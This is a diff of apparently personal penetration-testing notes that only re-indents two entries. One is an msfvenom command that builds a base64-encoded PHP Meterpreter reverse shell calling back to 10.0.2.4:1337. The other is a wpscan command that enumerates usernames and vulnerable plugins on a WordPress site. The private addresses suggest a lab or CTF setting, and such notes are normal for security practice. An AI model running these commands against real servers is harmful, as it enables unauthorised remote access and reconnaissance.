@@ -10,13 +10,13 @@
 
 #Reverse Shells using metasploit
 
-  1. msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.2.4 LPORT=1337 -e php/base64 > shell.php
-      append <?php ?> in the shell.php file
+  	1. msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.2.4 LPORT=1337 -e php/base64 > shell.php
+     		 append <?php ?> in the shell.php file
 
 #Wordpress Scanning
 	1. wpscan --url https://10.0.2.9:12038/blogblog --enumerate uvp
-    u : enumerate usernames 
-    vp : vulnerable plugins
+    		u : enumerate usernames 
+    		vp : vulnerable plugins
     
 #Changing a python urllib2.urlopen method to work with ssl
 
